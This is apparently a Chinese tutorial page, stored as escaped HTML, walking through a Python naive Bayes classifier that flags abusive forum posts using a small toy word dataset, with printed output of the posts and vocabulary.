&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; numpy &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;loadDataSet&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    postingList&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;[[&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;my&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;has&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;flea&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;problems&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;help&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;please&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;maybe&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;not&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;take&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;him&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;to&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;park&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stupid&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;my&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dalmation&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;is&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;so&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;cute&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;I&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;love&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;him&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stop&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;posting&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stupid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;worthless&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;garbage&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;mr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;licks&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;ate&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;my&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;steak&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;how&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;to&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stop&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;him&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;quit&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;buying&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;worthless&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;food&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stupid&amp;#39;&lt;/span&gt;]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    classVec &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;]    &lt;span style=&#34;color:#78787e&#34;&gt;#1 is abusive, 0 not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; postingList,classVec
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;createVocabList&lt;/span&gt;(dataSet):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    vocabSet &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;set&lt;/span&gt;([])  &lt;span style=&#34;color:#78787e&#34;&gt;#create empty set&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; document &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; dataSet:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        vocabSet &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; vocabSet &lt;span style=&#34;color:#ff6ac1&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;set&lt;/span&gt;(document) &lt;span style=&#34;color:#78787e&#34;&gt;#union of the two sets&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;list&lt;/span&gt;(vocabSet)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;setOfWords2Vec&lt;/span&gt;(vocabList, inputSet):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    returnVec &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(vocabList)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; word &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; inputSet:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; word &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; vocabList:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            returnVec[vocabList&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;index(word)] &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt;: &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;the word: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt; is not in my Vocabulary!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;%&lt;/span&gt; word)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; returnVec
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;trainNB0&lt;/span&gt;(trainMatrix,trainCategory):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    numTrainDocs &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(trainMatrix)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    numWords &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(trainMatrix[&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pAbusive &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;sum&lt;/span&gt;(trainCategory)&lt;span style=&#34;color:#ff6ac1&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;float&lt;/span&gt;(numTrainDocs)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p0Num &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; ones(numWords); p1Num &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; ones(numWords)      &lt;span style=&#34;color:#78787e&#34;&gt;#change to ones()，备注：初始化成1避免该项为0的情况发生&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p0Denom &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;2.0&lt;/span&gt;; p1Denom &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;2.0&lt;/span&gt;                        &lt;span style=&#34;color:#78787e&#34;&gt;#change to 2.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;range&lt;/span&gt;(numTrainDocs):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; trainCategory[i] &lt;span style=&#34;color:#ff6ac1&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            p1Num &lt;span style=&#34;color:#ff6ac1&#34;&gt;+=&lt;/span&gt; trainMatrix[i]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            p1Denom &lt;span style=&#34;color:#ff6ac1&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;sum&lt;/span&gt;(trainMatrix[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            p0Num &lt;span style=&#34;color:#ff6ac1&#34;&gt;+=&lt;/span&gt; trainMatrix[i]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            p0Denom &lt;span style=&#34;color:#ff6ac1&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;sum&lt;/span&gt;(trainMatrix[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p1Vect &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; log(p1Num&lt;span style=&#34;color:#ff6ac1&#34;&gt;/&lt;/span&gt;p1Denom)          &lt;span style=&#34;color:#78787e&#34;&gt;#change to log()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p0Vect &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; log(p0Num&lt;span style=&#34;color:#ff6ac1&#34;&gt;/&lt;/span&gt;p0Denom)          &lt;span style=&#34;color:#78787e&#34;&gt;#change to log()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; p0Vect,p1Vect,pAbusive
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;classifyNB&lt;/span&gt;(vec2Classify, p0Vec, p1Vec, pClass1):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p1 &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;sum&lt;/span&gt;(vec2Classify &lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt; p1Vec) &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; log(pClass1)    &lt;span style=&#34;color:#78787e&#34;&gt;#element-wise mult&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p0 &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;sum&lt;/span&gt;(vec2Classify &lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt; p0Vec) &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; log(&lt;span style=&#34;color:#ff9f43&#34;&gt;1.0&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt; pClass1)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; p1 &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;gt;&lt;/span&gt; p0:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;testingNB&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    listOPosts,listClasses &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; loadDataSet()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    myVocabList &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; createVocabList(listOPosts)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    trainMat&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;[]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; postinDoc &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; listOPosts:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        trainMat&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;append(setOfWords2Vec(myVocabList, postinDoc))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p0V,p1V,pAb &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; trainNB0(array(trainMat),array(listClasses))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    testEntry &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;love&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;my&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dalmation&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    thisDoc &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; array(setOfWords2Vec(myVocabList, testEntry))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(testEntry,&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;classified as: &amp;#39;&lt;/span&gt;,classifyNB(thisDoc,p0V,p1V,pAb))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    testEntry &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stupid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;garbage&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    thisDoc &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; array(setOfWords2Vec(myVocabList, testEntry))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(testEntry,&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;classified as: &amp;#39;&lt;/span&gt;,classifyNB(thisDoc,p0V,p1V,pAb))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;第一步加载已分类数据并创建词典&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%b8%80%e6%ad%a5%e5%8a%a0%e8%bd%bd%e5%b7%b2%e5%88%86%e7%b1%bb%e6%95%b0%e6%8d%ae%e5%b9%b6%e5%88%9b%e5%bb%ba%e8%af%8d%e5%85%b8&#34;&gt;
        #
    &lt;/a&gt;
    第一步：加载已分类数据，并创建词典
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listOPosts,listClasses &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; loadDataSet()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;myVocabList &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; createVocabList(listOPosts)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;All posts:&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;80&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(listOPosts)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;Vocabulary:&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;80&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(myVocabList)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;All posts:
--------------------------------------------------------------------------------
[[&#39;my&#39;, &#39;dog&#39;, &#39;has&#39;, &#39;flea&#39;, &#39;problems&#39;, &#39;help&#39;, &#39;please&#39;], [&#39;maybe&#39;, &#39;not&#39;, &#39;take&#39;, &#39;him&#39;, &#39;to&#39;, &#39;dog&#39;, &#39;park&#39;, &#39;stupid&#39;], [&#39;my&#39;, &#39;dalmation&#39;, &#39;is&#39;, &#39;so&#39;, &#39;cute&#39;, &#39;I&#39;, &#39;love&#39;, &#39;him&#39;], [&#39;stop&#39;, &#39;posting&#39;, &#39;stupid&#39;, &#39;worthless&#39;, &#39;garbage&#39;], [&#39;mr&#39;, &#39;licks&#39;, &#39;ate&#39;, &#39;my&#39;, &#39;steak&#39;, &#39;how&#39;, &#39;to&#39;, &#39;stop&#39;, &#39;him&#39;], [&#39;quit&#39;, &#39;buying&#39;, &#39;worthless&#39;, &#39;dog&#39;, &#39;food&#39;, &#39;stupid&#39;]]


Vocabulary:
--------------------------------------------------------------------------------
[&#39;to&#39;, &#39;mr&#39;, &#39;quit&#39;, &#39;take&#39;, &#39;my&#39;, &#39;dalmation&#39;, &#39;is&#39;, &#39;has&#39;, &#39;flea&#39;, &#39;stop&#39;, &#39;worthless&#39;, &#39;him&#39;, &#39;problems&#39;, &#39;cute&#39;, &#39;maybe&#39;, &#39;I&#39;, &#39;so&#39;, &#39;not&#39;, &#39;buying&#39;, &#39;help&#39;, &#39;how&#39;, &#39;park&#39;, &#39;food&#39;, &#39;garbage&#39;, &#39;steak&#39;, &#39;please&#39;, &#39;dog&#39;, &#39;ate&#39;, &#39;licks&#39;, &#39;posting&#39;, &#39;love&#39;, &#39;stupid&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;第二步将词典数据转换成可计算的向量&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e5%b0%86%e8%af%8d%e5%85%b8%e6%95%b0%e6%8d%ae%e8%bd%ac%e6%8d%a2%e6%88%90%e5%8f%af%e8%ae%a1%e7%ae%97%e7%9a%84%e5%90%91%e9%87%8f&#34;&gt;
        #
    &lt;/a&gt;
    第二步：将词典数据转换成可计算的向量
&lt;/div&gt;
&lt;/h2&gt;
